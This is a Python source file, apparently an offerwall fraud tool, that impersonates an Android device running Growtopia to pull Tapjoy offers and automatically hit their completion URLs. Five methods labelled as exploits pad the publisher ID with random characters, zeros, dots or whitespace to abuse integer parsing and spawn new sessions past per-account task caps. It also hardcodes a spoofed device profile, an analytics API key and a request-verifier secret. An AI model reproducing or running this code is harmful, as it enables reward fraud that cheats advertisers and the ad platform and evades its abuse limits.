from hashlib import sha256
import json
import random
from typing import List
import uuid
import time
import requests
from offer.offers import games
from misc.misc import generate_unique_uuid, _generate_random_string
from offer.offers import offerStruct
from httpClient.httpClient import httpClient

adjustOffers = []

class TapjoyManager:
    
    def string_exploit(self):
        # Using intval function for parsing publisher_id allows creating a new tapjoy session
        # by appending random string: intval("publisher_id string") -> publisher_id
        self.publisher_id = self.publisher_id + _generate_random_string(random.randint(1, 100)) 
    def zero_exploit(self):
        # Bypass regex check by prepending zeros: intval("0000publisher_id") -> publisher_id
        length = random.randint(1, 50000)
        self.publisher_id = ("0" * length) + self.publisher_id 
    def dot_exploit(self):
        # Append dots to exploit intval parsing: intval("publisher_id...") -> publisher_id
        length = random.randint(1, 50000)
        self.publisher_id = self.publisher_id + ("." * length)
    def dot_and_zero_exploit(self):
        # Combine dots and zeros: intval("publisher_id...0000") -> publisher_id
        length = random.randint(1, 50000)
        self.publisher_id = self.publisher_id + ("." * length) + ("0" * length)
    def whitespace_exploit(self):
        # Append whitespace: intval("publisher_id   ") -> publisher_id
        length = random.randint(1, 50000)
        self.publisher_id = self.publisher_id + (" " * length)

    # Note: These exploits were patched after one year.
    # The following account limitations have been implemented:
    # - Legacy accounts: Maximum 100 tasks per day
    # - New accounts: Maximum 1 task per day
    
    def __init__(self, proxy_str=None, publisher_id=None):
        self.connect_base_url = "https://connect.tapjoy.com"
        self.content_base_url = "https://placements.tapjoy.com"
        self.session_id = sha256(str(uuid.uuid1()).encode('utf-8')).hexdigest()
        self.install_id = sha256(str(uuid.uuid1()).encode('utf-8')).hexdigest()
        self.analys_id = generate_unique_uuid()
        self.ad_id = generate_unique_uuid()
        self.publisher_id  =publisher_id
        self.collectAdjust = False
        self.proxy_str = proxy_str
        self.session : httpClient = httpClient(proxy_str=proxy_str)
        self.html_content = ""
        self.offers = [] 
        self.session.headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G935X Build/N2G48H)",
            "Accept-Encoding": "gzip, deflate, br",
        })

    def send_get_content_request(self, data):
        url = f"{self.content_base_url}/v1/apps/cdafc64d-126e-4bec-abfd-85b207025a5f/content"
        response = self.session.post(url, data=data)
        return response

    @staticmethod
    def create_verifier(app_id, ad_id, timestamp, secret):
        input_ = f"{app_id}:{ad_id}:{timestamp}:{secret}"
        return sha256(input_.encode('utf-8')).hexdigest()

    def create_tapjoy_content(self):

        timestamp = int(time.time())
        managed_device_id = uuid.uuid4()
        country_code = "US"

        get_content_data = {
            "install_id": self.install_id,
            "advertising_id": self.ad_id,
            "session_id": self.session_id,
            "timestamp": timestamp,
            "device_type": "android",
            "avail_disk": "32676",
            "display_h": "720",
            "device_manufacturer": "Samsung",
            "installer": "com.android.coreservice",
            "pkg_sign": "D4Nzm1SThT2hFX5KIl2HYkAYT%2B0%3D",
            "pkg_ver": "5.01",
            "sdk_type": "event",
            "store_view": "true",
            "carrier_name": "Verizon",
            "event_preload": "true",
            "display_d": "460",
            "connection_type": "wifi",
            "installed": "1727984687766",
            "mobile_network_code": "03",
            "pkg_id": "com.rtsoft.growtopia",
            "debug": "false",
            "library_version": "12.10.0",
            "verifier": self.create_verifier(
                "cdafc64d-126e-4bec-abfd-85b207025a5f",
                self.ad_id,
                timestamp,
                "good luck"
            ),
            "analytics_id": self.analys_id,
            "screen_layout_size": "2",
            "library_revision": "dc5abdc",
            "plugin": "native",
            "timezone": "America%2FChicago",
            "store": "android.GooglePlay",
            "platform": "android",
            "session_last_length": "0",
            "app_group_id": "559c3807-357a-8000-8000-e7363c00ec00",
            "country_sim": country_code,
            "analytics_api_key": "VZw4BzV6gACAAOc2PADsAAExz7DqDmKHlXewgMdG6UqQzFb0tXX-OQFgTNc3",
            "bridge_version": "1.0.19",
            "omidpv": "1.3.16-tapjoy",
            "display_w": "1880",
            "brightness": "0.6",
            "session_total_count": "4",
            "language_code": "en",
            "country_code": country_code,
            "display_multiplier": "2.0",
            "total_disk": "368571",
            "session_last_at": "1724541747792",
            "publisher_user_id": self.publisher_id,
            "carrier_country_code": country_code.lower(),
            "session_total_length": "1709356",
            "event_name": "Grow_Store_Placement_01",
            "fq7": "1",
            "volume": "0.5",
            "app_id": "cdafc64d-126e-4bec-abfd-85b207025a5f",
            "device_gps_version": "243234017",
            "screen_density": "245",
            "pkg_rev": "358",
            "mobile_country_code": "286",
            "app_version": "5.01",
            "theme": "light",
            "device_name": "SM-G935X",
            "os_version": "9",
            "packaged_gps_version": "12451000",
            "system_placement": "false",
            "ad_tracking_enabled": "1",
            "fq30": "1",
            "cached_ids": "none",
            "managed_device_id": str(managed_device_id),
            "app_set_id": "ff5ebdee-0906-f293-7c24-8cbc5e7599d7",
            "is_offerwall_new_user": True,
            "user_tags[0]":"TJ4209834"
        }

        get_content_response = self.send_get_content_request(get_content_data)
        return get_content_response.text

    def getOffers(self) -> List[offerStruct]:
        data = self.create_tapjoy_content()
        self.html_content = data

        try:
            cropped = data.split("customOfferwallData: ")[1].split(",\"osVersion\":")[0].strip() + "}"
            cropped = json.loads(cropped)
        except (IndexError, json.JSONDecodeError):
            print("Error parsing offerwall data.")
            return None

        offers_url = cropped.get("offersURL")
        if not offers_url:
            print("No offersURL found.")
            return None

        offers_url += "&max=5000"
        response = self.session.get(offers_url, headers=self.session.headers)
        response_json = response.json()
        def addOffers(offer : offerStruct):
            for _offer in self.offers:
                if _offer.offerName == offer.offerName:
                    return
            self.offers.append(offer)
        def handle_app(offer):
            if "offer_properties" in offer and "tpat.tracker_partner" in offer["offer_properties"]:
                tracker_partner = offer["offer_properties"]["tpat.tracker_partner"]
                if any(partner in tracker_partner for partner in ["adjust", "singular", "tenjin"]):

                    # Add new offer to adjustOffers if necessary
                    if self.collectAdjust:
                        new_offer = {
                            "app_name": offer.get("app_name"),
                            "app_link": offer.get("app_info_url"),
                            "proxyData": {
                                self.proxy_str: {
                                    "payout": offer.get("payout"),
                                    "offer_properties": offer.get("offer_properties"),
                                    "events": offer.get("events", []),
                                }
                            }
                        }
                        adjustOffers.append(new_offer)
                        print(f"Added offer for {offer.get('app_name')} to Offers.")
                        return

            offer_app_name = offer.get("app_name", offer.get("title"))
            offer_url = offer.get("app_info_url", "---")
            
            offer_properties = offer.get("offer_properties", {})
            if 'frequency_capping.daily_cap' in offer_properties:
                dailyCap = offer_properties['frequency_capping.daily_cap']
            else:
                dailyCap = 0
            for game in games:
                if (game.offerName == offer_app_name or game.appLink in offer_url) and ( (game.isDaily and type(dailyCap) == int and dailyCap > 0) or (not game.isDaily)):
                    try:
                        response = self.session.get(offer["redirectURL"])
                        response.raise_for_status()
                        response_url = self.session.get(
                            response.json()["complete_instruction_url"],
                            headers={
                                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G935X Build/N2G48H)",
                            }
                        )
                        response_url.raise_for_status()
                        game.dailyMaxTask = dailyCap
                        addOffers(game)
                    except requests.exceptions.InvalidSchema:
                        game.dailyMaxTask = dailyCap
                        addOffers(game)
                    except Exception as e:
                        print(f"Error processing game {offer_app_name}: {e}")

        for offer in response_json.get("offers", []):
            handle_app(offer)
            
        horizontal_sections = response_json.get('horizontal_sections', [])
        for index in [0, 3]:
            if index < len(horizontal_sections):
                for offer in horizontal_sections[index].get("offers", []):
                    if "app_name" in offer or "title" in offer:
                        handle_app(offer)
                        
                        
        return self.offers
